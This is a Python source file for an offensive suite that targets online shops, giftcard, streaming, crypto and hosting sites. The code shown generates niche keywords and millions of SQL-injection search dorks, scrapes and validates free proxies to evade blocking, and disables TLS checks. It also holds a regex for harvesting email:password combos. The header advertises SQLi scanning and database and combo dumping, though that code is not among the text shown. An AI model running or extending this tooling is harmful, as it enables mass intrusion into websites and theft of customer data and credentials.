#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
  SPIDEY V18-TITAN — STANDALONE OFFLINE & LOCAL SUITE (WEB GUI + CLI EDITION)
  100% Independent of Telegram Bot API • Zero 50MB File Limit • PC / Laptop / VPS
  Modules Included End-to-End:
    [1] AI Target -> UHQ Keyword Maker (100% Offline Taxonomy + Optional Live Boost)
    [2] Keyword Quality Checker (Premium / Good / Normal / Bad + Split ZIP)
    [3] UHQ SQLi & High-Hit Dork Generator (Up to 5,000,000 Dorks Direct to Disk)
    [4] Multi-Source Proxy Scraper & Live SERP Validator
    [5] Clean Multi-Process (`execve`) 18-Engine UHQ URL Parser + Live DOM Spider
    [6] High-Speed SQLi Vulnerability Scanner (Error + Boolean + DBMS Fingerprint)
    [7] Automated UNION / Error SQLi Database & Combo Dumper (+ SQLMap Bridge)
    [8] Multi-Million Line Offline Refinery (Combos, Emails, ?param= URLs, Dedup)
    [9] 1-Click Full End-to-End Auto-Pilot (Seeds -> Keywords -> Dorks -> URLs -> SQLi -> Dump)
================================================================================
"""

from __future__ import annotations

import argparse
import base64
import concurrent.futures
import csv
import html as _html_mod
import io
import itertools
import json
import os
import random
import re
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import webbrowser
import zipfile
from datetime import datetime
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

SUITE_VERSION = "V18-TITAN OFFLINE SUITE"
BASE_DIR = Path(os.path.abspath(os.path.dirname(__file__)))
WORK_DIR = BASE_DIR / "spidey_offline_workspace"
SUBDIRS = (
    "keywords",
    "quality_checks",
    "dorks",
    "proxies",
    "parsed_urls",
    "sqli_vulns",
    "db_dumps",
    "refined",
    "uploads",
)
for _sd in SUBDIRS:
    (WORK_DIR / _sd).mkdir(parents=True, exist_ok=True)

SETTINGS_FILE = WORK_DIR / "suite_settings.json"

# Optional Rust `primp` TLS browser impersonation (auto-enabled if installed!)
try:
    import primp as _PRIMP_MOD
    HAS_PRIMP = True
except Exception:
    _PRIMP_MOD = None
    HAS_PRIMP = False

SSL_UNVERIFIED = ssl.create_default_context()
SSL_UNVERIFIED.check_hostname = False
SSL_UNVERIFIED.verify_mode = ssl.CERT_NONE


def detect_hardware_specs() -> dict:
    cores = os.cpu_count() or 4
    ram_gb = 8.0
    try:
        if os.path.isfile("/proc/meminfo"):
            with open("/proc/meminfo", "r", encoding="utf-8", errors="ignore") as f:
                for ln in f:
                    if ln.startswith("MemTotal:"):
                        kb = int(ln.split()[1])
                        ram_gb = round(kb / (1024 * 1024), 1)
                        break
    except Exception:
        pass
    return {"cores": cores, "ram_gb": ram_gb}


HW_INFO = detect_hardware_specs()

HARDWARE_PROFILES = {
    "auto": {
        "label": f"⚡ Auto-Detect ({HW_INFO['cores']} Cores / {HW_INFO['ram_gb']} GB RAM)",
        "workers": max(2, min(12, HW_INFO["cores"])),
        "parser_threads": max(24, min(160, HW_INFO["cores"] * 14)),
        "sqli_threads": max(40, min(320, HW_INFO["cores"] * 26)),
        "dump_threads": max(8, min(48, HW_INFO["cores"] * 4)),
    },
    "low": {
        "label": "🟢 Low (Laptop / 2-Core / 2–4 GB RAM)",
        "workers": 2,
        "parser_threads": 24,
        "sqli_threads": 45,
        "dump_threads": 8,
    },
    "medium": {
        "label": "🟡 Medium (4-Core PC / 8 GB RAM)",
        "workers": 4,
        "parser_threads": 56,
        "sqli_threads": 110,
        "dump_threads": 16,
    },
    "high": {
        "label": "🟠 High (8-Core PC / 16–32 GB RAM)",
        "workers": 8,
        "parser_threads": 110,
        "sqli_threads": 220,
        "dump_threads": 32,
    },
    "beast": {
        "label": "🔥 Beast (12+ Core / 62 GB RAM Dedicated VPS)",
        "workers": 12,
        "parser_threads": 180,
        "sqli_threads": 380,
        "dump_threads": 48,
    },
}


def load_settings() -> dict:
    default = {
        "profile": "beast" if HW_INFO["ram_gb"] >= 30 else "auto",
        "parser_mode": "balanced",  # blitz | balanced | deep
        "use_proxies": True,
        "online_autocomplete": False,
    }
    try:
        if SETTINGS_FILE.is_file():
            data = json.loads(SETTINGS_FILE.read_text(encoding="utf-8"))
            if isinstance(data, dict):
                default.update(data)
    except Exception:
        pass
    return default


def save_settings(cfg: dict) -> dict:
    cur = load_settings()
    cur.update(cfg)
    SETTINGS_FILE.write_text(json.dumps(cur, indent=2), encoding="utf-8")
    return cur


def get_active_limits() -> dict:
    cfg = load_settings()
    prof = HARDWARE_PROFILES.get(cfg.get("profile", "auto"), HARDWARE_PROFILES["auto"]).copy()
    prof["profile_key"] = cfg.get("profile", "auto")
    prof["parser_mode"] = cfg.get("parser_mode", "balanced")
    prof["use_proxies"] = bool(cfg.get("use_proxies", True))
    prof["online_autocomplete"] = bool(cfg.get("online_autocomplete", False))
    return prof


# ==============================================================================
# LIVE JOB STATE MANAGER (REAL-TIME PROGRESS, LOGS, CANCEL, STREAMING FILES)
# ==============================================================================
class JobState:
    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.running = False
        self.stop_flag = threading.Event()
        self.job_id = ""
        self.module = "Idle"
        self.phase = "Ready — Select any module or start 1-Click Full Pipeline"
        self.done = 0
        self.total = 0
        self.hits = 0
        self.extra_stat = ""
        self.started_at = 0.0
        self.logs: list[str] = [
            f"[{datetime.now().strftime('%H:%M:%S')}] 🚀 {SUITE_VERSION} initialized.",
            f"[{datetime.now().strftime('%H:%M:%S')}] 💻 Detected Hardware: {HW_INFO['cores']} CPU Cores • {HW_INFO['ram_gb']} GB RAM • TLS Engine: {'Rust primp HTTP/2 + stdlib' if HAS_PRIMP else 'Built-in Multi-Thread SSL Engine'}",
            f"[{datetime.now().strftime('%H:%M:%S')}] 📂 Workspace: {WORK_DIR}",
        ]
        self.last_outputs: list[dict] = []
        self.last_qc_summary: dict | None = None
        self.child_procs: list[subprocess.Popen] = []

    def start(self, module_name: str, total: int = 100, reinit: bool = False) -> bool:
        with self.lock:
            if self.running and not reinit:
                return False
            self.running = True
            self.stop_flag.clear()
            if not reinit or not self.job_id:
                self.job_id = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.module = module_name
            self.phase = f"Starting {module_name}..."
            self.done = 0
            self.total = max(1, int(total))
            self.hits = 0
            self.extra_stat = ""
            if not reinit or not self.started_at:
                self.started_at = time.time()
                self.last_outputs = []
            self._append_log_unlocked(f"▶️ Started [{module_name}] (Job #{self.job_id})")
            return True

    def _append_log_unlocked(self, msg: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        self.logs.append(f"[{ts}] {msg}")
        if len(self.logs) > 250:
            self.logs = self.logs[-250:]

    def log(self, msg: str) -> None:
        with self.lock:
            self._append_log_unlocked(msg)

    def update(self, done: int | None = None, total: int | None = None, hits: int | None = None, phase: str | None = None, extra: str | None = None) -> None:
        with self.lock:
            if done is not None:
                self.done = int(done)
            if total is not None:
                self.total = max(1, int(total))
            if hits is not None:
                self.hits = int(hits)
            if phase is not None:
                self.phase = phase
            if extra is not None:
                self.extra_stat = extra

    def add_output(self, path: Path, label: str, line_count: int, next_action: str = "") -> None:
        rel = str(path.relative_to(WORK_DIR))
        size_kb = round(path.stat().st_size / 1024, 1) if path.exists() else 0.0
        item = {
            "label": label,
            "filename": path.name,
            "rel_path": rel,
            "lines": int(line_count),
            "size_kb": size_kb,
            "next_action": next_action,
        }
        with self.lock:
            self.last_outputs.append(item)
            self._append_log_unlocked(f"💾 Saved {path.name} ({line_count:,} lines • {size_kb:,.1f} KB)")

    def finish(self, summary_msg: str = "Completed") -> None:
        with self.lock:
            self.running = False
            self.phase = summary_msg
            self._append_log_unlocked(f"✅ {summary_msg}")
            self.child_procs.clear()

    def request_stop(self) -> None:
        self.stop_flag.set()
        with self.lock:
            self._append_log_unlocked("🛑 Stop signal sent! Terminating active workers...")
            procs = list(self.child_procs)
        for p in procs:
            try:
                p.terminate()
            except Exception:
                pass

    def snapshot(self) -> dict:
        with self.lock:
            elapsed = round(max(0.0, (time.time() - self.started_at) if self.started_at else 0.0), 1)
            pct = min(100, int((self.done * 100) / max(1, self.total))) if self.total else 0
            rate = round(self.done / max(0.1, elapsed), 1) if self.running and elapsed > 0 else 0.0
            return {
                "running": self.running,
                "job_id": self.job_id,
                "module": self.module,
                "phase": self.phase,
                "done": self.done,
                "total": self.total,
                "pct": pct,
                "hits": self.hits,
                "rate": rate,
                "elapsed": elapsed,
                "extra_stat": self.extra_stat,
                "logs": list(self.logs[-90:]),
                "outputs": list(self.last_outputs),
                "qc_summary": self.last_qc_summary,
                "limits": get_active_limits(),
                "has_primp": HAS_PRIMP,
            }


JOB = JobState()


# ==============================================================================
# MODULE 1: OFFLINE AI UHQ KEYWORD PARSER & GENERATOR + MODULE 2: QUALITY CHECKER
# ==============================================================================
NICHE_TAXONOMY: dict[str, dict[str, list[str]]] = {
    "ecommerce_stripe": {
        "brands": [
            "stripe checkout", "woocommerce store", "shopify boutique", "magento shop",
            "opencart store", "prestashop boutique", "bigcommerce shop", "square checkout",
            "braintree payment", "klarna checkout", "razorpay store", "payu shop",
            "authorize net", "checkout cart", "digital store", "giftcard shop",
        ],
        "modifiers": [
            "add to cart", "order summary", "billing address", "customer login",
            "checkout payment", "my orders", "account dashboard", "voucher code",
            "track order", "invoice details", "member discount", "vip store",
            "instant delivery", "product catalog", "item details", "shop category",
        ],
    },
    "gaming_giftcards": {
        "brands": [
            "steam wallet", "valorant points", "pubg uc", "genshin crystal",
            "playstation psn", "xbox gamepass", "roblox robux", "fortnite vbuck",
            "razer gold", "g2a key", "eneba store", "kinguin shop",
            "cdkeys digital", "nintendo eshop", "riot points", "freefire diamond",
        ],
        "modifiers": [
            "topup store", "instant code", "redeem key", "buy voucher",
            "digital pin", "account shop", "checkout cart", "order status",
            "member area", "vip topup", "global key", "cdkey shop",
        ],
    },
    "streaming_ott": {
        "brands": [
            "netflix premium", "spotify family", "disney plus", "iptv subscription",
            "crunchyroll mega", "youtube premium", "prime video", "hbo max",
            "apple tv", "dazn sports", "paramount plus", "xtream codes",
        ],
        "modifiers": [
            "subscription plan", "account login", "member portal", "panel login",
            "reseller panel", "renewal checkout", "instant access", "4k uhd plan",
            "m3u portal", "customer area", "billing portal", "vip pass",
        ],
    },
    "crypto_fintech": {
        "brands": [
            "usdt voucher", "crypto giftcard", "bitcoin shop", "binance pay",
            "coinbase commerce", "bitrefill card", "crypto checkout", "web3 store",
            "hardware wallet", "mining host", "forex signal", "trading academy",
        ],
        "modifiers": [
            "payment gateway", "instant voucher", "order invoice", "client area",
            "member dashboard", "deposit history", "checkout page", "merchant store",
        ],
    },
    "saas_hosting": {
        "brands": [
            "whmcs client", "cpanel hosting", "vps server", "rdp shop",
            "dedicated hosting", "domain registrar", "cloud server", "smtp relay",
            "vpn subscription", "proxy panel", "seo tools", "smm panel",
        ],
        "modifiers": [
            "clientarea", "billing login", "order form", "submit ticket",
            "cart php", "invoice pdf", "api token", "user dashboard",
        ],
    },
}

COMMERCIAL_HIGH_SIGNAL = frozenset([
    "checkout", "stripe", "shop", "store", "cart", "order", "payment", "billing",
    "voucher", "giftcard", "topup", "account", "login", "member", "portal",
    "client", "customer", "invoice", "product", "catalog", "item", "category",
    "woocommerce", "magento", "opencart", "whmcs", "subscription", "reseller",
    "wallet", "redeem", "premium", "panel", "digital", "boutique", "merchant",
])

GEO_TOKENS = [
    "usa", "uk", "canada", "australia", "germany", "france", "spain",
    "italy", "brazil", "mexico", "uae", "singapore", "japan", "india", "europe",
]

DB_INTENT_SUFFIXES = [
    "checkout", "store", "shop", "cart", "order", "login", "account",
    "member", "portal", "catalog", "voucher", "billing", "customer",
    "item", "category", "payment", "panel", "online", "digital", "vip",
]

JUNK_KEYWORD_WORDS = frozenset([
    "wikipedia", "youtube", "facebook", "instagram", "tiktok", "lyrics",
    "meaning", "definition", "wallpaper", "memes", "quotes", "weather",
    "horoscope", "news today", "pdf free textbook", "homework",
])


def generate_offline_uhq_keywords(prompt_or_seeds: list[str], count: int = 2000, online_boost: bool = False) -> list[str]:
    """100% Pure Offline UHQ Keyword Generator (with optional live autocomplete boost if online_boost=True)."""
    count = max(10, min(2_000_000, int(count)))
    raw_joined = " ".join(prompt_or_seeds).lower()

    matched_brands: list[str] = []
    matched_mods: list[str] = []

    for _, pack in NICHE_TAXONOMY.items():
        if any(tok in raw_joined for b in pack["brands"] for tok in b.split()):
            matched_brands.extend(pack["brands"])
            matched_mods.extend(pack["modifiers"])

    clean_seeds: list[str] = []
    for s in prompt_or_seeds:
        c = re.sub(r"\b(?:inurl|site|intitle|intext|filetype):\S+", " ", str(s), flags=re.I)
        c = re.sub(r"[^a-zA-Z0-9\s\-]", " ", c).strip().lower()
        c = " ".join(c.split()[:4])
        if len(c) >= 2:
            clean_seeds.append(c)

    if not clean_seeds and not matched_brands:
        for pack in NICHE_TAXONOMY.values():
            matched_brands.extend(pack["brands"])
            matched_mods.extend(pack["modifiers"])

    base_pool = list(dict.fromkeys(clean_seeds + matched_brands))
    mod_pool = list(dict.fromkeys(matched_mods + DB_INTENT_SUFFIXES))

    if online_boost and clean_seeds:
        for sd in clean_seeds[:8]:
            try:
                u = "https://suggestqueries.google.com/complete/search?" + urllib.parse.urlencode({"client": "firefox", "q": sd})
                req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=2.5, context=SSL_UNVERIFIED) as r:
                    arr = json.loads(r.read().decode("utf-8", errors="ignore"))
                    if isinstance(arr, list) and len(arr) >= 2:
                        for sug in arr[1]:
                            cs = re.sub(r"[^a-zA-Z0-9\s\-]", " ", str(sug).lower()).strip()
                            if cs and cs not in base_pool:
                                base_pool.append(cs)
            except Exception:
                break

    out: list[str] = []
    seen: set[str] = set()

    def _push(kw: str) -> bool:
        kw = " ".join(kw.split()).strip()
        if len(kw) < 4 or kw in seen:
            return False
        seen.add(kw)
        out.append(kw)
        return len(out) >= count

    for b in base_pool:
        for m in mod_pool:
            if m not in b and _push(f"{b} {m}"):
                return out[:count]

    for b in base_pool:
        for m in mod_pool:
            for g in GEO_TOKENS:
                if m not in b and _push(f"{b} {m} {g}"):
                    return out[:count]

    idx = 1
    while len(out) < count:
        b = base_pool[idx % len(base_pool)]
        m1 = mod_pool[(idx // 3) % len(mod_pool)]
        m2 = DB_INTENT_SUFFIXES[(idx // 7) % len(DB_INTENT_SUFFIXES)]
        g = GEO_TOKENS[(idx // 11) % len(GEO_TOKENS)]
        cand = f"{b} {m1} {g}" if idx % 2 == 0 else f"{b} {m1} {m2} {idx}"
        _push(cand)
        idx += 1

    return out[:count]


def check_keywords_quality_offline(lines: list[str]) -> dict:
    """Keevo-Style Multi-Signal Offline Keyword Quality Scorer (0–100 score -> Premium / Good / Normal / Bad)."""
    premium, good, normal, bad, all_unique = [], [], [], [], []
    seen: set[str] = set()

    for raw in lines:
        kw = " ".join(str(raw).strip().split())
        if not kw:
            continue
        low = kw.lower()
        if low in seen:
            continue
        seen.add(low)
        all_unique.append(kw)

        # Reject obvious junk / raw URLs / single char noise into `bad`
        if (
            len(low) < 4
            or len(low) > 72
            or low.startswith(("http://", "https://"))
            or any(jw in low for jw in JUNK_KEYWORD_WORDS)
            or sum(ch.isalpha() for ch in low) < 3
        ):
            bad.append(kw)
            continue

        words = low.split()
        wc = len(words)
        score = 46

        if 2 <= wc <= 4:
            score += 22
        elif wc == 5:
            score += 12
        elif wc == 1:
            score -= 8
        else:
            score -= 14

        hits = sum(1 for w in words if w in COMMERCIAL_HIGH_SIGNAL)
        score += min(30, hits * 15)

        if any(g in words for g in GEO_TOKENS):
            score += 7
        if any(op in low for op in ("inurl:", "intitle:", "site:")):
            score -= 12

        score = max(0, min(100, score))
        if score >= 82:
            premium.append(kw)
        elif score >= 66:
            good.append(kw)
        elif score >= 45:
            normal.append(kw)
        else:
            bad.append(kw)

    tot = max(1, len(all_unique))
    return {
        "total_input": len(lines),
        "unique": len(all_unique),
        "duplicates_removed": max(0, len(lines) - len(all_unique)),
        "premium": premium,
        "good": good,
        "normal": normal,
        "bad": bad,
        "all": all_unique,
        "pct": {
            "premium": round(len(premium) * 100.0 / tot, 1),
            "good": round(len(good) * 100.0 / tot, 1),
            "normal": round(len(normal) * 100.0 / tot, 1),
            "bad": round(len(bad) * 100.0 / tot, 1),
        },
    }


# ==============================================================================
# MODULE 3: ULTRA-FAST OFFLINE UHQ SQLi DORK GENERATOR (UP TO 5,000,000 DORKS!)
# ==============================================================================
GOLD_FILES = [
    "product.php", "item.php", "category.php", "detail.php", "details.php",
    "catalog.php", "shop.php", "view.php", "page.php", "index.php",
    "order.php", "cart.php", "member.php", "profile.php", "store.php",
    "article.php", "news.php", "event.php", "gallery.php", "info.php",
    "offer.php", "package.php", "plan.php", "voucher.php", "download.php",
]

GOLD_PARAMS = [
    "id", "pid", "cid", "cat", "item", "product_id", "item_id", "cat_id",
    "page_id", "order_id", "uid", "nid", "num", "view", "prod", "no", "sid",
]

GOLD_TLDS = [
    "com", "net", "org", "co.uk", "ca", "com.au", "de", "fr",
    "es", "it", "nl", "pl", "ro", "br", "mx", "in", "sg", "my", "za",
]


def stream_generate_uhq_dorks_to_file(keywords: list[str], count: int, out_file: Path, dork_style: str = "mixed") -> int:
    """Streams clean 2–3 word high-yield SQLi dorks directly to disk (handles 50K to 5,000,000 lines in low RAM!)."""
    count = max(10, min(5_000_000, int(count)))
    core_kws: list[str] = []
    seen_kw: set[str] = set()
    for rk in keywords:
        toks = [w for w in re.sub(r"[^a-zA-Z0-9\-]", " ", str(rk).lower()).split() if len(w) >= 2 and not w.isdigit()]
        for take_n in (2, 3, 1):
            if len(toks) >= take_n:
                ph = " ".join(toks[:take_n])
                if ph not in seen_kw:
                    seen_kw.add(ph)
                    core_kws.append(ph)

    if not core_kws:
        core_kws = ["stripe store", "checkout cart", "giftcard shop", "gaming topup", "member login", "voucher store"]

    random.shuffle(core_kws)
    files = GOLD_FILES.copy()
    params = GOLD_PARAMS.copy()
    tlds = GOLD_TLDS.copy()

    written = 0
    buf: list[str] = []
    f_len, p_len, k_len, t_len = len(files), len(params), len(core_kws), len(tlds)

    with open(out_file, "w", encoding="utf-8", buffering=1024 * 1024) as wf:
        idx = 0
        while written < count:
            if JOB.stop_flag.is_set():
                break
            fn = files[idx % f_len]
            pr = params[(idx // f_len) % p_len]
            kw = core_kws[(idx // 3) % k_len]
            tl = tlds[(idx // 7) % t_len]
            mode = idx % 4
            if dork_style == "bing_native":
                d = f"{fn} {pr}= {kw}" if mode % 2 == 0 else f"instreamset:(url):{fn.split('.')[0]} {pr} {kw}"
            elif dork_style == "google_inurl":
                d = f"inurl:{fn}?{pr}= {kw}" if mode != 3 else f"inurl:{fn}?{pr}= {kw} site:{tl}"
            else:
                if mode == 0:
                    d = f"inurl:{fn}?{pr}= {kw}"
                elif mode == 1:
                    d = f"{fn}?{pr}= {kw}"
                elif mode == 2:
                    d = f"inurl:{fn}?{pr}= {kw} site:{tl}"
                else:
                    d = f"{fn} {pr}= {kw} checkout"
            buf.append(d)
            written += 1
            idx += 1
            if len(buf) >= 25_000:
                wf.write("\n".join(buf) + "\n")
                buf.clear()
                JOB.update(done=written, total=count, hits=written, phase=f"Generating UHQ SQLi Dorks ({written:,} / {count:,})...")
        if buf:
            wf.write("\n".join(buf) + "\n")
    return written


# ==============================================================================
# MODULE 4, 5, 6, 7, 8 & 9: PROXIES, PARSER, SQLi SCANNER, DB DUMPER, REFINERY
# ==============================================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
]

PROXY_FEEDS = [
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/Sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
]

SKIP_DOMAINS = (
    "google.", "bing.com", "microsoft.com", "yahoo.com", "duckduckgo.com",
    "brave.com", "ecosia.org", "aol.com", "mojeek.com", "startpage.com",
    "facebook.com", "instagram.com", "twitter.com", "x.com", "youtube.com",
    "tiktok.com", "linkedin.com", "pinterest.", "reddit.com", "wikipedia.org",
    "amazon.", "ebay.", "github.com", "stackoverflow.com", "cloudflare.com",
    "w3.org", "schema.org", "gstatic.com", "googleapis.com", "doubleclick.net",
)

JUNK_EXT_RE = re.compile(
    r"\.(?:jpg|jpeg|png|gif|webp|svg|ico|css|js|woff|woff2|ttf|eot|mp4|mp3|avi|pdf|zip|rar|7z|exe|apk|dmg)$",
    re.I,
)

TRACKING_PARAMS = frozenset([
    "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term",
    "fbclid", "gclid", "msclkid", "twclid", "ttclid", "yclid", "mc_cid", "mc_eid",
])

RSS_LINK_RE = re.compile(r"<link>\s*(https?://[^<\s]+)\s*</link>", re.I)
BING_U_RE = re.compile(r"(?:[?&]|&amp;)u=(a1[A-Za-z0-9_\-]+=*)")
YAHOO_RU_RE = re.compile(r"/RU=([^/\"'<>]+)")
DDG_UDDG_RE = re.compile(r"[?&]uddg=([^&\"'<>]+)")
GOOGLE_Q_RE = re.compile(r"/url\?(?:[^\"'<>]*&)?q=(https?[^&\"'<>]+)")
HREF_RE = re.compile(r'href=["\']([^"\'<>#]{4,600})["\']', re.I)
FORM_RE = re.compile(r'<form\b[^>]*action=["\']([^"\'<>#]{1,300})["\'][^>]*>(.*?)</form>', re.I | re.S)
INPUT_NAME_RE = re.compile(r'<input\b[^>]*name=["\']([a-zA-Z0-9_]{1,32})["\']', re.I)
EMAIL_PASS_RE = re.compile(r"([a-zA-Z0-9_.+\-]+@[a-zA-Z0-9\-]+\.[a-zA-Z0-9.\-]+):([^\s:;\"'<>]{4,64})")
PURE_EMAIL_RE = re.compile(r"[a-zA-Z0-9_.+\-]+@[a-zA-Z0-9\-]+\.[a-zA-Z0-9.\-]+")


def clean_proxy_line(raw: str) -> str:
    s = raw.strip()
    if not s or s.startswith("#"):
        return ""
    if "://" not in s and re.match(r"^\d{1,3}(?:\.\d{1,3}){3}:\d{2,5}$", s):
        return "http://" + s
    if s.startswith(("http://", "https://", "socks4://", "socks5://")):
        return s
    return ""


def load_saved_proxies() -> list[str]:
    pfile = WORK_DIR / "proxies" / "elite_proxies.txt"
    if not pfile.is_file():
        return []
    return [clean_proxy_line(x) for x in pfile.read_text(encoding="utf-8", errors="ignore").splitlines() if clean_proxy_line(x)]


def fast_http_fetch(
    url: str,
    params: dict | None = None,
    post_data: dict | None = None,
    proxy: str = "",
    timeout: float = 4.5,
    extra_headers: dict | None = None,
) -> tuple[int, str]:
    """Universal zero-crash HTTP client: uses Rust `primp` TLS impersonation when available, else stdlib `urllib` SSL."""
    hdrs = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    if extra_headers:
        hdrs.update(extra_headers)

    if HAS_PRIMP and _PRIMP_MOD is not None:
        try:
            kw_cli = {"impersonate": "random", "verify": False, "follow_redirects": True, "timeout": timeout}
            if proxy:
                kw_cli["proxy"] = proxy
            cli = _PRIMP_MOD.Client(**kw_cli)
            if post_data is not None:
                resp = cli.post(url, data=post_data, headers=hdrs, timeout=timeout)
            else:
                resp = cli.get(url, params=params, headers=hdrs, timeout=timeout)
            if resp.status_code:
                return int(resp.status_code), (resp.text or "")
        except Exception:
            pass

    try:
        full_url = f"{url}?{urllib.parse.urlencode(params)}" if (params and post_data is None) else url
        body_bytes = urllib.parse.urlencode(post_data).encode("utf-8") if post_data is not None else None
        req = urllib.request.Request(full_url, data=body_bytes, headers=hdrs, method="POST" if body_bytes is not None else "GET")
        handlers: list = [urllib.request.HTTPSHandler(context=SSL_UNVERIFIED)]
        if proxy and proxy.startswith(("http://", "https://")):
            hp = proxy.split("://", 1)[1]
            handlers.insert(0, urllib.request.ProxyHandler({"http": f"http://{hp}", "https": f"http://{hp}"}))
        opener = urllib.request.build_opener(*handlers)
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(350_000)
            return int(getattr(r, "status", 200)), raw.decode("utf-8", errors="ignore")
    except urllib.error.HTTPError as he:
        try:
            raw = he.read(120_000).decode("utf-8", errors="ignore")
        except Exception:
            raw = ""
        return int(he.code), raw
    except Exception:
        return 0, ""


def scrape_and_validate_proxies(custom_proxies: list[str] | None = None, max_test: int = 800) -> list[str]:
    raw_set: list[str] = []
    if custom_proxies:
        for p in custom_proxies:
            cp = clean_proxy_line(p)
            if cp:
                raw_set.append(cp)

    JOB.update(phase="Scraping live proxy feeds from GitHub CDN...")
    for feed in PROXY_FEEDS:
        if JOB.stop_flag.is_set():
            break
        code, txt = fast_http_fetch(feed, timeout=5.0)
        if code == 200 and txt:
            for ln in txt.splitlines():
                cp = clean_proxy_line(ln)
                if cp:
                    raw_set.append(cp)

    candidates = list(dict.fromkeys(raw_set))[:max_test]
    if not candidates:
        return []

    JOB.update(done=0, total=len(candidates), hits=0, phase=f"Validating {len(candidates):,} proxies against real Bing RSS SERP...")
    live_list: list[tuple[float, str]] = []
    done_n = [0]
    lk = threading.Lock()

    def _check_one(px: str) -> None:
        if JOB.stop_flag.is_set():
            return
        t0 = time.monotonic()
        code, body = fast_http_fetch(
            "https://www.bing.com/search",
            params={"q": "product.php shop", "format": "rss", "count": "10"},
            proxy=px,
            timeout=3.0,
        )
        with lk:
            done_n[0] += 1
            if code == 200 and "<item>" in body.lower():
                live_list.append((time.monotonic() - t0, px))
            if done_n[0] % 25 == 0 or done_n[0] == len(candidates):
                JOB.update(done=done_n[0], total=len(candidates), hits=len(live_list))

    with concurrent.futures.ThreadPoolExecutor(max_workers=120) as ex:
        list(ex.map(_check_one, candidates))

    live_list.sort(key=lambda x: x[0])
    verified = [p for _, p in live_list]
    out_p = WORK_DIR / "proxies" / "elite_proxies.txt"
    out_p.write_text("\n".join(verified) + ("\n" if verified else ""), encoding="utf-8")
    JOB.add_output(out_p, "Verified SERP Proxies", len(verified))
    return verified


def decode_bing_u(url_or_tok: str) -> str:
    m = BING_U_RE.search(url_or_tok.replace("&amp;", "&"))
    tok = m.group(1) if m else (url_or_tok if url_or_tok.startswith("a1") else "")
    if not tok:
        return url_or_tok
    raw = tok[2:] if tok.startswith("a1") else tok
    rem = len(raw) % 4
    if rem:
        raw += "=" * (4 - rem)
    for fn in (base64.urlsafe_b64decode, base64.b64decode):
        try:
            dec = fn(raw).decode("utf-8", errors="ignore").strip()
            if dec.startswith(("http://", "https://")):
                return dec
        except Exception:
            continue
    return url_or_tok


def is_clean_target_url(u: str) -> bool:
    try:
        p = urllib.parse.urlparse(u.strip())
        if p.scheme not in ("http", "https"):
            return False
        dom = p.netloc.lower().split(":")[0].removeprefix("www.")
        if not dom or "." not in dom or len(dom) < 4:
            return False
        if any(s in dom for s in SKIP_DOMAINS):
            return False
        has_q = bool(p.query and "=" in p.query)
        if (not p.path or p.path == "/") and not has_q:
            return False
        if p.path and JUNK_EXT_RE.search(p.path):
            return False
        return True
    except Exception:
        return False


def endpoint_signature(u: str) -> str:
    p = urllib.parse.urlparse(u)
    dom = p.netloc.lower().removeprefix("www.")
    keys = sorted(set(k.lower() for k, _ in urllib.parse.parse_qsl(p.query, keep_blank_values=True) if k.lower() not in TRACKING_PARAMS))
    return f"{dom}{p.path}|{'&'.join(keys)}"


def translate_dork_native(raw_dork: str, eng: str) -> str:
    m_sc = re.search(r"([a-zA-Z0-9_\-]+\.(?:php|asp|aspx|jsp|cfm))", raw_dork, re.I)
    script_tok = m_sc.group(1).lower() if m_sc else ""
    stem = script_tok.rsplit(".", 1)[0] if script_tok else ""
    m_pr = re.search(r"[?&:]?([a-zA-Z0-9_]{1,20})=", raw_dork, re.I)
    param_tok = m_pr.group(1).lower() if m_pr else "id"
    if param_tok in ("inurl", "site", "intitle", "intext"):
        param_tok = "id"

    clean = re.sub(r"\b(?:all)?(?:inurl|intitle|intext|filetype|ext|site):\S+", " ", raw_dork, flags=re.I)
    words = [
        w for w in re.sub(r"[^a-zA-Z0-9\-]", " ", clean.lower()).split()
        if len(w) >= 2 and not w.isdigit() and w not in ("php", "asp", "html", stem, param_tok)
    ][:3]
    niche = " ".join(words[:2]) if words else "online shop"

    if eng in ("google_web", "startpage_web"):
        return f"inurl:{script_tok or 'product.php'}?{param_tok}= {niche}"
    if eng.startswith(("bing", "yahoo", "aol")):
        if hash(raw_dork) % 2 == 0 and stem and stem not in ("index", "main", "home"):
            return f"instreamset:(url):{stem} {param_tok} {niche}"
        return f"{script_tok or 'product.php'} {param_tok}= {niche}"
    return f"{script_tok or 'product.php'} {param_tok} {niche}"


